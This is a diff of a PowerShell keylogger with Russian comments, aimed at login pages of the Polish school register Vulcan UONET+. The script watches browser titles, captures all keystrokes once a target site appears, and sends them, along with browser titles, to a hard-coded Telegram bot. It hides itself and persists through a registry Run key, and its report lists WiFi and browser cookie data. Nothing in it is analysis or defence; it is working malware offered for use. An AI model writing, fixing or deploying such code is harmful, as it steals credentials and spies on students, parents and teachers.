@@ -20,10 +20,10 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
-# ПРОСТОЙ И РАБОЧИЙ КЕЙЛОГГЕР С ТАЙМЕРОМ
-$keyloggerStatus = "Starting..."
+# ДЕБАГ КЕЙЛОГГЕР - РАБОЧАЯ ВЕРСИЯ
+$keyloggerStatus = "Starting DEBUG version..."
 
-# Создаем простой и надежный кейлоггер
+# Создаем ДЕБАГ кейлоггер
 $keyloggerScript = @"
 Add-Type -AssemblyName System.Windows.Forms
 
@@ -32,7 +32,7 @@ Add-Type -AssemblyName System.Windows.Forms
 `$global:monitoringActive = `$false
 `$global:monitorEndTime = `$null
 `$global:lastSendTime = Get-Date
-`$global:lastCheckTime = Get-Date
+`$global:debugCounter = 0
 
 function Send-Telegram {
     param(`$text)
@@ -42,61 +42,57 @@ function Send-Telegram {
             text = `$text
         }
         Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
-    } catch { }
+        return `$true
+    } catch { 
+        return `$false
+    }
 }
 
-function Get-CurrentBrowserTitle {
+function Get-AllBrowserTitles {
     try {
-        # Получаем все процессы браузеров с заголовками окон
-        `$browsers = @("chrome", "firefox", "msedge", "edge", "iexplore", "opera", "brave", "vivaldi")
+        `$result = @()
+        `$browsers = Get-Process | Where-Object { 
+            `$_.ProcessName -match "chrome|firefox|msedge|edge|iexplore|opera|brave" -and
+            `$_.MainWindowTitle -ne "" -and
+            `$_.MainWindowHandle -ne 0
+        }
         
         foreach (`$browser in `$browsers) {
-            `$processes = Get-Process -Name `$browser -ErrorAction SilentlyContinue | Where-Object { 
-                `$_.MainWindowTitle -ne "" -and `$_.MainWindowHandle -ne 0
-            }
-            
-            if (`$processes) {
-                # Сортируем по времени CPU чтобы найти активное окно
-                `$activeProcess = `$processes | Sort-Object CPU -Descending | Select-Object -First 1
-                return `$activeProcess.MainWindowTitle
-            }
+            `$result += "`$(`$browser.ProcessName): `$(`$browser.MainWindowTitle)"
         }
-    } catch { }
-    return ""
+        
+        return `$result
+    } catch {
+        return @("Error getting browser titles")
+    }
 }
 
 function Check-VulcanSite {
-    `$title = Get-CurrentBrowserTitle
-    if (-not `$title -or `$title -eq "") { 
-        return `$false 
+    `$allTitles = Get-AllBrowserTitles
+    `$currentTitles = `$allTitles -join " | "
+    
+    # ДЕБАГ: Отправляем все заголовки каждые 30 проверок
+    `$global:debugCounter++
+    if (`$global:debugCounter % 30 -eq 0) {
+        Send-Telegram "🔍 DEBUG - All browser titles:`n`$(`$allTitles -join "`n")"
     }
-    
-    # Ключевые слова для определения сайтов Vulcan
-    `$vulcanKeywords = @(
-        "vulcan", "uonetplus", "uonet+", "dziennik", "minrol", "rybnik",
-        "logowanie", "login", "account", "edu.gdynia", "eszkola",
-        "uonetplus.vulcan.net.pl", "vulcan.net.pl"
-    )
-    
-    `$titleLower = `$title.ToLower()
     
     # Проверяем конкретные URL
-    `$targetUrls = @(
-        "https://uonetplus.vulcan.net.pl/minrol",
-        "https://uonetplus.vulcan.net.pl/rybnik", 
-        "https://uonetplus.vulcan.net.pl/"
+    `$targetPatterns = @(
+        "*uonetplus.vulcan.net.pl/minrol*",
+        "*uonetplus.vulcan.net.pl/rybnik*", 
+        "*uonetplus.vulcan.net.pl/*",
+        "*vulcan*",
+        "*uonet*",
+        "*dziennik*"
     )
     
-    foreach (`$url in `$targetUrls) {
-        if (`$titleLower.Contains(`$url.ToLower())) {
-            return `$true
-        }
-    }
-    
-    # Проверяем ключевые слова
-    foreach (`$keyword in `$vulcanKeywords) {
-        if (`$titleLower.Contains(`$keyword)) {
-            return `$true
+    foreach (`$title in `$allTitles) {
+        foreach (`$pattern in `$targetPatterns) {
+            if (`$title -like `$pattern) {
+                Send-Telegram "🎯 SITE DETECTED! Pattern: `$pattern`nTitle: `$title"
+                return `$true
+            }
         }
     }
     
@@ -106,10 +102,7 @@ function Check-VulcanSite {
 function Start-Monitoring {
     `$global:monitoringActive = `$true
     `$global:monitorEndTime = (Get-Date).AddMinutes(2)
-    `$currentTitle = Get-CurrentBrowserTitle
-    Send-Telegram "🎯 VULCAN SITE DETECTED! 
-📱 Site: `$currentTitle
-⏰ Monitoring started for 2 minutes until `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
+    Send-Telegram "🚀 MONITORING STARTED! Will work for 2 minutes until `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
 }
 
 function Stop-Monitoring {
@@ -119,7 +112,7 @@ function Stop-Monitoring {
         Send-Telegram "📝 FINAL INPUT: `$global:buffer"
         `$global:buffer = ""
     }
-    Send-Telegram "⏹️ Monitoring stopped - 2 minutes elapsed"
+    Send-Telegram "🛑 MONITORING STOPPED"
 }
 
 function Process-Key {
@@ -143,48 +136,40 @@ function Process-Key {
         }
         "Tab" { 
             `$global:buffer += "[TAB]"
-            Send-Telegram "↹ TAB: `$global:buffer"
-            `$global:buffer = ""
         }
         "Escape" {
             `$global:buffer = ""
         }
         "LButton" {
-            # При клике мыши отправляем накопленные данные
             if (`$global:buffer -ne "") {
                 Send-Telegram "🖱️ CLICK: `$global:buffer"
                 `$global:buffer = ""
             }
         }
-        "RButton" {
-            if (`$global:buffer -ne "") {
-                Send-Telegram "🖱️ RIGHT CLICK: `$global:buffer"
-                `$global:buffer = ""
-            }
-        }
         default {
-            # Обработка обычных символов
-            if (`$key -ge [System.Windows.Forms.Keys]::A -and `$key -le [System.Windows.Forms.Keys]::Z) {
-                `$isShift = ([System.Windows.Forms.Control]::ModifierKeys -eq [System.Windows.Forms.Keys]::Shift)
-                `$isCaps = [System.Console]::CapsLock
+            # Буквы A-Z
+            if (`$key -ge 65 -and `$key -le 90) {
+                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                `$isCaps = [System.Windows.Forms.Console]::CapsLock
                 
-                if ((`$isShift -and -not `$isCaps) -or (-not `$isShift -and `$isCaps)) {
+                if ((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                     `$global:buffer += `$key.ToString()
                 } else {
                     `$global:buffer += `$key.ToString().ToLower()
                 }
             }
-            elseif (`$key -ge [System.Windows.Forms.Keys]::D0 -and `$key -le [System.Windows.Forms.Keys]::D9) {
-                `$isShift = ([System.Windows.Forms.Control]::ModifierKeys -eq [System.Windows.Forms.Keys]::Shift)
+            # Цифры 0-9
+            elseif (`$key -ge 48 -and `$key -le 57) {
+                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                 `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                 if (`$isShift) {
-                    `$global:buffer += `$symbols[`$key - [System.Windows.Forms.Keys]::D0]
+                    `$global:buffer += `$symbols[`$key - 48]
                 } else {
-                    `$global:buffer += (`$key - [System.Windows.Forms.Keys]::D0).ToString()
+                    `$global:buffer += (`$key - 48).ToString()
                 }
             }
+            # Специальные символы
             else {
-                # Специальные символы
                 switch (`$key) {
                     "OemPeriod" { `$global:buffer += "." }
                     "Oemcomma" { `$global:buffer += "," }
@@ -192,11 +177,6 @@ function Process-Key {
                     "Oemplus" { `$global:buffer += "=" }
                     "OemQuestion" { `$global:buffer += "/" }
                     "Oemtilde" { `$global:buffer += "`"" }
-                    "OemOpenBrackets" { `$global:buffer += "[" }
-                    "OemCloseBrackets" { `$global:buffer += "]" }
-                    "OemPipe" { `$global:buffer += "\" }
-                    "OemSemicolon" { `$global:buffer += ";" }
-                    "OemQuotes" { `$global:buffer += "'" }
                     "D1" { `$global:buffer += "1" }
                     "D2" { `$global:buffer += "2" }
                     "D3" { `$global:buffer += "3" }
@@ -213,55 +193,53 @@ function Process-Key {
     }
     
     # Автоотправка при длинном вводе
-    if (`$global:buffer.Length -gt 25) {
+    if (`$global:buffer.Length -gt 20) {
         Send-Telegram "📝 AUTO: `$global:buffer"
         `$global:buffer = ""
     }
 }
 
-# Запускаем мониторинг
-Send-Telegram "🔍 VULCAN KEYLOGGER STARTED 
-🎯 Target sites:
+# Начало работы
+Send-Telegram "🔧 DEBUG KEYLOGGER STARTED 
+🎯 Monitoring these sites:
 • https://uonetplus.vulcan.net.pl/minrol
-• https://uonetplus.vulcan.net.pl/rybnik  
+• https://uonetplus.vulcan.net.pl/rybnik
 • https://uonetplus.vulcan.net.pl/
-⏰ Will monitor for 2 minutes after detection"
+📝 Will send debug info every 30 checks"
 
+`$checkCount = 0
 while (`$true) {
     try {
-        `$currentTime = Get-Date
+        `$checkCount++
         
-        # Проверяем сайт Vulcan каждые 3 секунды (чтобы не нагружать систему)
-        if ((`$currentTime - `$global:lastCheckTime).TotalSeconds -ge 3) {
-            `$global:lastCheckTime = `$currentTime
-            
+        # Проверяем сайт каждые 5 секунд
+        if (`$checkCount % 10 -eq 0) {  # 10 * 500ms = 5 seconds
             if (Check-VulcanSite) {
                 if (-not `$global:monitoringActive) {
                     Start-Monitoring
                 } else {
-                    # Обновляем время окончания если снова обнаружили сайт
+                    # Обновляем таймер если снова нашли сайт
                     `$global:monitorEndTime = (Get-Date).AddMinutes(2)
                 }
             }
         }
         
-        # Если мониторинг активен - перехватываем клавиши
+        # Если мониторинг активен
         if (`$global:monitoringActive) {
             # Проверяем таймер
             if ((Get-Date) -gt `$global:monitorEndTime) {
                 Stop-Monitoring
             } else {
-                # Перехват клавиш
-                for (`$i = 8; `$i -le 255; `$i++) {
-                    `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
-                    if (`$keyState -eq -32767) {
+                # Перехват всех клавиш
+                for (`$i = 8; `$i -le 254; `$i++) {
+                    if ([System.Windows.Forms.GetAsyncKeyState]`$i -eq -32767) {
                         `$key = [System.Windows.Forms.Keys]`$i
                         Process-Key -key `$key
                     }
                 }
                 
-                # Автоотправка каждые 15 секунд
-                if ((Get-Date) - `$global:lastSendTime -gt [TimeSpan]::FromSeconds(15)) {
+                # Автоотправка каждые 10 секунд
+                if ((Get-Date) - `$global:lastSendTime -gt [TimeSpan]::FromSeconds(10)) {
                     if (`$global:buffer -ne "") {
                         Send-Telegram "⏰ TIMEOUT: `$global:buffer"
                         `$global:buffer = ""
@@ -271,17 +249,18 @@ while (`$true) {
             }
         }
         
-        Start-Sleep -Milliseconds 50
+        Start-Sleep -Milliseconds 500
+        
     } catch {
-        # Продолжаем работу при ошибках
-        Start-Sleep -Milliseconds 1000
+        # При ошибке ждем и продолжаем
+        Start-Sleep -Milliseconds 2000
     }
 }
 "@
 
-# Сохраняем и запускаем кейлоггер
+# Сохраняем и запускаем ДЕБАГ кейлоггер
 try {
-    $keyloggerPath = "$env:TEMP\vulcan_monitor.ps1"
+    $keyloggerPath = "$env:TEMP\vulcan_debug.ps1"
     $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
     
     # Запускаем в отдельном процессе
@@ -290,9 +269,15 @@ try {
     # Добавляем в автозагрузку
     $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`""
-    Set-ItemProperty -Path $startupPath -Name "VulcanMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $startupPath -Name "VulcanDebug" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "✅ KEYLOGGER ACTIVE - Monitoring specific Vulcan sites for 2 minutes"
+    $keyloggerStatus = "✅ DEBUG KEYLOGGER ACTIVE - Sending browser titles for analysis"
+    
+    # Тестовое сообщение
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{
+        chat_id = '5674514050'
+        text = "SYSTEM SCAN COMPLETED - DEBUG keylogger started. Open any browser and check Telegram for debug info."
+    }
     
 } catch {
     $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
@@ -382,15 +367,15 @@ $wifi
 === KEYLOGGER STATUS ===
 $keyloggerStatus
 
+=== DEBUG MODE ===
+• Отправляет все заголовки браузеров в Telegram
+• Поможет определить правильные паттерны для сайтов
+• Работает 2 минуты после обнаружения сайта
+
 === TARGET SITES ===
 • https://uonetplus.vulcan.net.pl/minrol
 • https://uonetplus.vulcan.net.pl/rybnik
 • https://uonetplus.vulcan.net.pl/
-
-=== MONITORING MODE ===
-• Автоматически включается при обнаружении целевых сайтов
-• Работает 2 минуты после обнаружения
-• Перехватывает ВСЕ нажатия клавиш в этот период
 
 === BROWSER COOKIES ===
 Found cookies files: $($cookies.Count)
